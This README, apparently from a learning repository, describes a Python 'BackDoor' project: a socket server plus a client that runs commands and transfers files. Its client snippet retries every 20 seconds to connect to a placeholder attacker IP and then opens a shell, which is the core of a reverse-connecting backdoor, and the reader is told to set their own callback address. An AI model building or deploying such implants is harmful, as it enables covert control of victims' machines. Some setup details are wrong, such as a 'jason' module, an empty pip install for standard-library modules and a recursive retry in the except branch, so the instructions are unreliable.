## BackDoor

### Objective
To create a client-server application for communication, command execution, and file transfer over a network.

### Skills Learned
* Socket programming for network communication
* JSON data encoding and decoding
* Process management using subprocess
* File handling and I/O operations
* Concurrent programming (for handling multiple clients, potentially)

### Tools Used
  Python Standard Library:
* socket
* time
* subprocess
* jason
* os

You can install them using pip:

```bash
pip install 
```
### Steps

#### 1) Server Setup:
  * Import necessary modules: socket, json, os.
  * Define functions for reliable sending, receiving, file transfer, and client handling.
  * Create a socket, bind it to an address, and listen for incoming connections.
  * Accept incoming connections and handle client communication in a separate thread or process (optional).
  * Change the ip and port on the code:
    ```python
    sock.bind(('xxx.xxx.xxx.xxx', pppp))
    ```

#### 2) Client Setup:
  * Import necessary modules: socket, time, subprocess, json, os.
  * Define functions for reliable sending, receiving, file transfer, and command execution.
  * Establish a connection to the server.
  * Implement a command-line interface or graphical user interface for user interaction.
  * Handle incoming data from the server and display it to the user.
  * Change the ip and port on the code
    ```python
    def connection():
	while True:
		time.sleep(20)
		try:
			s.connect(('xxx.xxx.xxx.xxx',pppp))
			shell()
			s.close()
			break
		except:
			connection()
    ```

#### 3) Communication Protocol:
  * Define the communication protocol between the client and server, including command formats, data structures, and error handling      mechanisms.
  * Implement the protocol in both the client and server code.
   
